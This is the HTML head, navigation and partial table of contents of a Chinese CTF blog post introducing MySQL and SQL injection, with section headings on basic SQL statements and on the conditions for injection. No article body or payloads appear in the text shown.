<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.ico">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"wanth3f1ag.top","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"atom-one-dark","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
<script>
  (function () {
    var OriginTitle = document.title;
    var titleTime;
    document.addEventListener('visibilitychange', function () {
      if (document.hidden) {
        document.title = '坏人！看完了就想走' + OriginTitle;
        clearTimeout(titleTime);
      } else {
        document.title = '(*´∇｀*)你回来啦~' + OriginTitle;
        titleTime = setTimeout(function () {
          document.title = OriginTitle;
        }, 2000);
      }
    });
  })();
</script>

    <meta property="og:type" content="article">
<meta property="og:title" content="深入浅出sql注入之mysql">
<meta property="og:url" content="https://wanth3f1ag.top/2025/05/21/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAsql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql/index.html">
<meta property="og:site_name" content="root@wanth3f1ag">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501135923222.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501135942522.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501154327821.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501154828820.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501154837240.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501155323854.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501155400249.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250114135354948.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501155537879.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501161209160.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501161222713.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501162603534.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501162618206.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501162728136.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501162800467.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501162818925.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501162836667.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501163025582.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501163222396.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501163307391.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501163542370.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250117005436111.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501163930059.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501164023543.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501164225475.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250507173534809.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501164508719.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250117005809461.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501165205561.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250502192842462.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250502194528555.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250502194621453.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250502194857297.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250502195047549.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250502195204371.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250502174953509.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250502200245616.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250502200230188.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250520135904729.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250829112852026.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250829112948597.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250829113021895.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250829113421679.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250829113527116.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250829114140616.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20251011170450499.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250829114511676.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250829115111487.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250507171245178.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250507172447811.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250121163822411.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250119205506435.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250505123112675.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250505123133565.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250505145732313.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250505145944295.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250505150508798.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250506111505548.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250310161630529.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250521161100598.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250604164511808.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250604164803664.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250912151632690.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250912152751157.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250912153602799.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250502133652917.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250502134808478.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250502135045046.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024/image-20250328233832896.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024/image-20250318145612654.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250521165019521.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/1.1.1.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20241206194113814-1733485276606-10.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20241206194907105-1733485750110-12.png">
<meta property="article:published_time" content="2025-05-21T09:27:02.000Z">
<meta property="article:modified_time" content="2025-12-27T07:19:57.467Z">
<meta property="article:author" content="wanTh3flag">
<meta property="article:tag" content="MYSQL注入">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250501135923222.png">


<link rel="canonical" href="https://wanth3f1ag.top/2025/05/21/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAsql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://wanth3f1ag.top/2025/05/21/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAsql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql/","path":"2025/05/21/深入浅出sql注入之mysql/","title":"深入浅出sql注入之mysql"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>深入浅出sql注入之mysql | root@wanth3f1ag</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
<script src="/js/third-party/search/local-search.js" defer></script>





  <script src="/js/third-party/pace.js" defer></script>


  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">root@wanth3f1ag</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">CTFer</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="s4arch" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-h0me"><a href="/" rel="section"><i class="home fa-fw"></i>H0me</a></li><li class="menu-item menu-item-a6out"><a href="/about/" rel="section"><i class="user fa-fw"></i>A6out</a></li><li class="menu-item menu-item-t6gs"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>T6gs</a></li><li class="menu-item menu-item-catagories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>Catagories</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="link fa-fw"></i>L1nks</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>s4arch
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="搜索..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01sql%E6%B3%A8%E5%85%A5%E5%89%8D%E7%BD%AE"><span class="nav-number">1.</span> <span class="nav-text">0x01sql注入前置</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%9F"><span class="nav-number">1.1.</span> <span class="nav-text">什么是数据库？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFsql%EF%BC%9F"><span class="nav-number">1.2.</span> <span class="nav-text">什么是sql？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFsql%E6%B3%A8%E5%85%A5%EF%BC%9F"><span class="nav-number">1.3.</span> <span class="nav-text">什么是sql注入？</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02%E6%AD%A3%E6%96%87"><span class="nav-number">2.</span> <span class="nav-text">0x02正文</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#MYSQL%E6%B3%A8%E5%85%A5"><span class="nav-number">2.1.</span> <span class="nav-text">MYSQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux%E4%B8%AD%E6%90%AD%E5%BB%BAMysql%E6%9C%8D%E5%8A%A1"><span class="nav-number">2.1.1.</span> <span class="nav-text">Linux中搭建Mysql服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0-SHOW%E5%88%97%E5%87%BA%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%97%E8%A1%A8"><span class="nav-number">2.1.2.</span> <span class="nav-text">0. SHOW列出数据库列表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%93%8D%E4%BD%9C%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">2.1.3.</span> <span class="nav-text">1. 操作数据库</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-CREATE%E5%88%9B%E5%BB%BA%E5%92%8CDROP%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">2.1.3.1.</span> <span class="nav-text">1.1 CREATE创建和DROP删除数据库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-USE%E6%8C%87%E5%AE%9A%E6%93%8D%E4%BD%9C%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">2.1.3.2.</span> <span class="nav-text">1.2 USE指定操作数据库</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%93%8D%E4%BD%9C%E6%95%B0%E6%8D%AE%E8%A1%A8"><span class="nav-number">2.1.4.</span> <span class="nav-text">2. 操作数据表</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-SHOW%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E8%A1%A8%E5%88%97%E8%A1%A8"><span class="nav-number">2.1.4.1.</span> <span class="nav-text">2.1 SHOW查看数据库中的表列表</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-CREATE%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E8%A1%A8"><span class="nav-number">2.1.4.2.</span> <span class="nav-text">2.2 CREATE创建数据表</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#mysql%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="nav-number">2.1.4.2.1.</span> <span class="nav-text">mysql数据类型</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-3-RNAME%E4%BF%AE%E6%94%B9%E5%92%8CDROP%E5%88%A0%E9%99%A4%E8%A1%A8"><span class="nav-number">2.1.4.3.</span> <span class="nav-text">2.3 RNAME修改和DROP删除表</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%93%8D%E4%BD%9C%E6%95%B0%E6%8D%AE"><span class="nav-number">2.1.5.</span> <span class="nav-text">3. 操作数据</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-%E6%9F%A5%E8%AF%A2%E5%BD%93%E5%89%8D%E8%A1%A8%E4%B8%8B%E5%AD%97%E6%AE%B5"><span class="nav-number">2.1.5.1.</span> <span class="nav-text">3.1 查询当前表下字段</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-INSERT%E6%B7%BB%E5%8A%A0%E6%95%B0%E6%8D%AE"><span class="nav-number">2.1.5.2.</span> <span class="nav-text">3.2 INSERT添加数据</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE"><span class="nav-number">2.1.6.</span> <span class="nav-text">4. 查询数据</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#4-1-SELECT%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE"><span class="nav-number">2.1.6.1.</span> <span class="nav-text">4.1 SELECT查询数据</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WHERE%E5%AD%90%E8%AF%AD%E5%8F%A5"><span class="nav-number">2.1.7.</span> <span class="nav-text">WHERE子语句</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-UPDATE%E6%9B%B4%E6%96%B0%E6%95%B0%E6%8D%AE"><span class="nav-number">2.1.8.</span> <span class="nav-text">5. UPDATE更新数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-DELETE%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE"><span class="nav-number">2.1.9.</span> <span class="nav-text">6.DELETE删除数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LIKE%E5%AD%90%E8%AF%AD%E5%8F%A5%E5%92%8C%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="nav-number">2.1.10.</span> <span class="nav-text">LIKE子语句和通配符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-UNION%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%93%8D%E4%BD%9C"><span class="nav-number">2.1.11.</span> <span class="nav-text">7.UNION联合查询操作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GROUP-BY-%E5%AD%90%E8%AF%AD%E5%8F%A5"><span class="nav-number">2.1.12.</span> <span class="nav-text">GROUP BY 子语句</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ORDER-BY-%E5%AD%90%E8%AF%AD%E5%8F%A5"><span class="nav-number">2.1.13.</span> <span class="nav-text">ORDER BY 子语句</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#group-concat-%E5%87%BD%E6%95%B0"><span class="nav-number">2.1.14.</span> <span class="nav-text">group_concat()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-JOIN%E5%B7%A6%E5%8F%B3%E8%BF%9E%E6%8E%A5"><span class="nav-number">2.1.15.</span> <span class="nav-text">8.JOIN左右连接</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#LEFT-JOIN%E5%B7%A6%E8%BF%9E%E6%8E%A5"><span class="nav-number">2.1.15.1.</span> <span class="nav-text">LEFT JOIN左连接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#RIGHT-JOIN%E5%8F%B3%E8%BF%9E%E6%8E%A5"><span class="nav-number">2.1.15.2.</span> <span class="nav-text">RIGHT JOIN右连接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#inner-join%E5%86%85%E8%BF%9E%E6%8E%A5"><span class="nav-number">2.1.15.3.</span> <span class="nav-text">inner join内连接</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7"><span class="nav-number">2.1.16.</span> <span class="nav-text">9.运算符优先级</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#10-regexp%E5%92%8Crlike%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D"><span class="nav-number">2.1.17.</span> <span class="nav-text">10.regexp和rlike正则匹配</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#11-ALTER%E4%BF%AE%E6%94%B9%E8%A1%A8%E5%92%8C%E5%AD%97%E6%AE%B5"><span class="nav-number">2.1.18.</span> <span class="nav-text">11.ALTER修改表和字段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-MYSQL%E9%A2%84%E5%A4%84%E7%90%86%E8%AF%AD%E5%8F%A5"><span class="nav-number">2.1.19.</span> <span class="nav-text">12.MYSQL预处理语句</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#PREPARE-%E8%AF%AD%E5%8F%A5"><span class="nav-number">2.1.19.1.</span> <span class="nav-text">PREPARE 语句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#EXECUTE-%E8%AF%AD%E5%8F%A5"><span class="nav-number">2.1.19.2.</span> <span class="nav-text">EXECUTE 语句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DEALLOCATE-PREPARE-%E8%AF%AD%E5%8F%A5"><span class="nav-number">2.1.19.3.</span> <span class="nav-text">DEALLOCATE PREPARE 语句</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#13-show-status%E8%AF%AD%E5%8F%A5"><span class="nav-number">2.1.20.</span> <span class="nav-text">13.show status语句</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MYSQL%E6%B3%A8%E5%85%A5%E5%89%8D%E6%8F%90"><span class="nav-number">2.2.</span> <span class="nav-text">MYSQL注入前提</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#INFORMATION-SCHEMA%E5%BA%93"><span class="nav-number">2.2.1.</span> <span class="nav-text">INFORMATION_SCHEMA库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5"><span 